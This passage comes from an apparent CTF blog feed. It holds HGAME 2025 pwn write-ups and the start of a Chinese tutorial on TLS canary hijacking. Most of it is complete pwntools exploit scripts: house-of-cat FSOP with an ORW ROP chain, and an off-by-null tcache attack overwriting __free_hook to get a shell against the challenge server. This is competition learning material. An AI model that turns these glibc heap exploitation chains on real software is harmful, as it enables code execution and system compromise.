class="line">sl(str(-10))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(hex(heap_base+0x1590))</span><br><span class="line">IO_list_all_xor=(heap_base+0x1590&gt;&gt;12)^IO_list_all</span><br><span class="line">edit(18,b&#x27;a&#x27;,0x100,b&#x27;\x00&#x27;*(0x30)+p64(0x81)+p64(IO_list_all_xor))</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk3=heap_base+0x1660-0x8 # 伪造的fake_IO结构体的地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">fake_ret=chunk3+0xe0+0xe0+0x18</span><br><span class="line"></span><br><span class="line">IO_FILE1 = p64(0)*3+p64(1)+b&#x27;\x00&#x27;*0x38+p64(0)                         #_chain</span><br><span class="line">IO_FILE1+= p32(0)+b&#x27;\x08&#x27;                                              #_flags2</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0x80,b&#x27;\x00&#x27;)+p64(chunk3)                    #lock</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0x90,b&#x27;\x00&#x27;)+p64(chunk3+0xe0)               #_wide_data  ***  rdx</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0xb0,b&#x27;\x00&#x27;)</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0xc8,b&#x27;\x00&#x27;)+p64(_IO_wfile_jumps)           #vtable</span><br><span class="line"></span><br><span class="line">IO_FILE1+= b&#x27;\x00&#x27;.ljust(0xa0,b&#x27;\x00&#x27;)+p64(fake_ret)+p64(rdi+1)</span><br><span class="line">IO_FILE1+= b&#x27;/flag\x00\x00\x00&#x27;.ljust(0x30,b&#x27;\x00&#x27;)+p64(chunk3+0xe0+0xe8-0x68)+p64(setcontext+61)</span><br><span class="line">IO_FILE1+= p64(rdi+1)*2+shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(25,0x68,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">add(26,0x3f0,IO_FILE1)</span><br><span class="line">add(27,0x68,b&#x27;\x00&#x27;*8+p64(chunk3))</span><br><span class="line"></span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(5))</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="Where-is-the-vulnerability">Where is the vulnerability</h4><p>菜单堆题，2.39</p><p>add,edit,free,show四个功能正常</p><p>存在uaf漏洞，这里直接走house of cat就行</p><p>存在沙盒，走orw</p><p>三个库patch一下就行，不要忘了更改权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 路径  文件</span><br><span class="line">patchelf --replace-needed libhgame.so 路径  文件</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so 路径 文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31346)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line"></span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">add(0,0x520) #0</span><br><span class="line">add(1,0x558) #1</span><br><span class="line">add(2,0x510) #2</span><br><span class="line">add(3,0x550) #3</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_base=get_addr64()-2112288</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+0x0000000000066b9a</span><br><span class="line">#rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">add(4,0x600)</span><br><span class="line">edit(0,b&#x27;a&#x27;*(0x10))</span><br><span class="line">show(0)</span><br><span class="line">rl(b&#x27;a&#x27;*(0x10))</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x290</span><br><span class="line">li(hex(heap_base))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">edit(0,p64(libc_base+2113360)*2+p64(heap_base+0x290)+p64(IO_list_all-0x20))</span><br><span class="line">add(5,0x600)</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk3=heap_base+0xd20 # 伪造的fake_IO结构体的地址</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line">fake_IO_FILE  =p64(0)*2+p64(1)+p64(chunk3+0x8)  </span><br><span class="line">fake_IO_FILE  =fake_IO_FILE.ljust(0x60,b&#x27;\x00&#x27;)  </span><br><span class="line">fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi</span><br><span class="line">fake_IO_FILE +=p64(heap_base)              </span><br><span class="line">fake_IO_FILE +=p64(0x100)                       #rdx</span><br><span class="line">fake_IO_FILE  =fake_IO_FILE.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE +=p64(chunk3+0x8)                  #_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE +=p64(chunk3+0xf0)+p64(rdi+1)      #rsp</span><br><span class="line">fake_IO_FILE +=p64(0)+p64(1)+p64(0)*2</span><br><span class="line">fake_IO_FILE +=p64(_IO_wfile_jumps+0x30)        # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(setcontext+61)+p64(chunk3+0xc8)</span><br><span class="line">fake_IO_FILE +=p64(read)</span><br><span class="line"></span><br><span class="line">edit(2,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(5))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw  = p64(rdi) + p64(heap_base+0xea0)  </span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rsi)+p64(heap_base+0x100)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rsi)+p64(heap_base+0x100)</span><br><span class="line">orw += p64(write)+b&#x27;./flag\x00\x00&#x27;</span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="signin2Heap">signin2Heap</h4><p>菜单堆题，2.27</p><p>add，free,show三个功能函数</p><p>add中存在of by null漏洞，限制大小&lt;0xff</p><p>因为add会将最后一个字符转为\x00会将打印函数截断</p><p>这里我们先把tcache塞满，之后能得到进入unsortdbin堆块，控制好堆布局，将下一个堆块的pr_size和pr_inuse位修改，释放触发堆块合并，之后将第一个堆块申请出来，libc地址就会进入第二个堆块中，这个堆块还没有释放，泄露得到libc</p><p>之后再次造成堆块合并，同时申请出第一个堆块包含第二个（未释放）fd位，释放第二个堆块，我们就可以更改它的fd位，完成tcachebin attack，攻击free_hook，getshell</p><p>原理的话可以看这篇文章<a href="https://www.jianshu.com/p/056c9db22d81">https://www.jianshu.com/p/056c9db22d81</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739887952446-796c20d1-bffb-4c3d-a316-89b6477a7889.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31701)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size,content):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(p32(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0xf8,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">add(7,0xf8,&quot;aaaa&quot;)#7</span><br><span class="line">add(8,0x88,&quot;aaaa&quot;)#8</span><br><span class="line">add(9,0xf8,&quot;aaaa&quot;)#9</span><br><span class="line">add(10,0x88,&quot;aaaa&quot;)#10</span><br><span class="line">for i in range(7):</span><br><span class="line">    free(i)</span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line"></span><br><span class="line">add(11,0x88,b&#x27;a&#x27;*0x80+p64(0x90+0x100))</span><br><span class="line"></span><br><span class="line">free(9)</span><br><span class="line">#bug()</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0xf8,&quot;/bin/sh\x00&quot;)</span><br><span class="line">add(7,0xf8,&quot;cccc&quot;)</span><br><span class="line">show(11)</span><br><span class="line">libc_base=get_addr64()-4111520</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">add(8,0x88,b&#x27;a&#x27;)</span><br><span class="line">add(9,0xf8,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line">add(12,0x88,b&#x27;a&#x27;*0x80+p64(0x90+0x100))</span><br><span class="line">free(9)</span><br><span class="line"></span><br><span class="line">add(13,0x88,b&#x27;a&#x27;)</span><br><span class="line">free(13)</span><br><span class="line">free(11)</span><br><span class="line">add(14,0xb8,b&#x27;\x00&#x27;*0x60+p64(0x100)+p64(0x90)+p64(free_hook))</span><br><span class="line">add(0,0x88,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">add(1,0x88,p64(system))</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">2025HGAME</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>TLS劫持过canary</title>
    <link href="https://www.thir0th.xyz/posts/d7e62ac2.html"/>
    <id>https://www.thir0th.xyz/posts/d7e62ac2.html</id>
    <published>2025-04-19T09:13:35.000Z</published>
    <updated>2025-05-07T08:10:35.676Z</updated>
    
    <content type="html"><![CDATA[<h1>pth_create</h1><p>CTFwiki:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</span><br></pre></td></tr></table></figure><h2 id="基础知识：">基础知识：</h2><p><a href="https://xz.aliyun.com/t/13074?time__1311=GqmhBKqIxGxBMx%2BoEDcWwP%2B34R2PoD">TLS_bypass_Canary - 先知社区 (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/CH13hh/p/18296983">劫持TLS绕过canary &amp;&amp; 堆和栈的灵活转换 - CH13hh - 博客园 (cnblogs.com)</a></p><p><font style="color:rgb(35, 38, 59);">什么是TLScanary？</font></p><p><font style="color:rgb(35, 38, 59);">TLScanary 是一种在 Pwn（主要是二进制漏洞利用）中常见的技术，专门用于处理 TLS 保护的二进制文件。在安全竞赛（例如 CTF）和漏洞利用场景中，攻击者需要应对目标程序的多层安全机制，其中 TLS 是一种常见的保护措施。TLScanary 结合了 TLS 协议与堆栈保护（stack canary）技术，增加了攻击难度。</font></p><p><font style="color:rgb(35, 38, 59);">可见TLS和canary有着不可分割的关系</font></p><p><font style="color:rgb(35, 38, 59);">TLS的基本概念（pwn canary中）</font></p><p><font style="color:rgb(35, 38, 59);">TLS 是一种用于在线程本地存储数据的机制。每个线程都有自己的 TLS 区域，用于存储与该线程相关的特定数据。</font></p><p><font style="color:rgb(35, 38, 59);">在堆栈保护方面，TLS 常被用于存储堆栈 canary 值，这是一种防止缓冲区溢出攻击的安全措施。</font></p><p><font style="color:rgb(35, 38, 59);">堆栈 canary 是一种在函数返回地址之前插入的特殊值，用于检测堆栈溢出。如果缓冲区溢出覆盖了 canary 值，程序会在返回前检测到不一致，并终止执行，防止恶意代码执行。</font></p><p><font style="color:rgb(35, 38, 59);">其实对于多线程的canary来说，每个线程的canary都是独立存在的，当一个线程被创建时，操作系统会为该线程分配一个独立的 TLS 区域。这个区域通常通过某种线程控制块（TCB）来管理，每个线程都有一个独立的 TCB。</font></p><p><font style="color:rgb(35, 38, 59);">在多线程环境中，每个线程的堆栈上都会有一个独立的 canary 值。操作系统或运行时库在为每个线程分配堆栈时，会在堆栈的适当位置插入一个 canary 值。</font></p><p><font style="color:rgb(77, 77, 77);">pthread_create 说白了就是线程id放下了数组，然后创建的线程走start那个函数</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;pthread.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> pthread_create(</span><br><span class="line">                 pthread_t *restrict tidp,   //新创建的线程ID指向的内存单元。</span><br><span class="line">                 const pthread_attr_t *restrict attr,  //线程属性，默认为NULL</span><br><span class="line">                 void *(*start_rtn)(void *), //新创建的线程从start_rtn函数的地址开始运行</span><br><span class="line">                 void *restrict arg //默认为NULL。若上述函数需要参数，将参数放入结构中并将地址作为arg传入。</span><br><span class="line">                  );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">pthread_join 使一个线程等待另一个线程结束</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> pthread_join(pthread_t thread, void **value_ptr);</span><br><span class="line">thread：等待退出线程的线程号。</span><br><span class="line">value_ptr：退出线程的返回值。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="适用条件：">适用条件：</h2><p>pth_create创造的子进程中可以溢出大量字节，一般为0x900,要覆盖fs+0x28的canary</p><p>一般结合栈迁移来使用</p><p>调试 fsbase</p><p><a href="https://grxer.github.io/2023/03/26/TLS-Hijack/">TLS劫持过canary(TLS Hijack Bypass Canary) (grxer.github.io)</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553204255-5891a608-40d4-44c2-8f34-4e8e3c105e61.png" alt=""></p><h2 id="来个例题">来个例题</h2><p><font style="color:rgb(33, 37, 41);">starctf2018_babystack</font></p><p><font style="color:rgb(33, 37, 41);">有个0x10000的溢出字节，覆盖后执行栈迁移泄露libc_base，把栈迁到bss并构造一次read，最后打one_gadget</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553119658-84a5b867-3214-4ac8-8539-f3587b4cc188.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1723553129176-c0e06097-1dd6-412a-8f56-5c8d1fda0424.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> 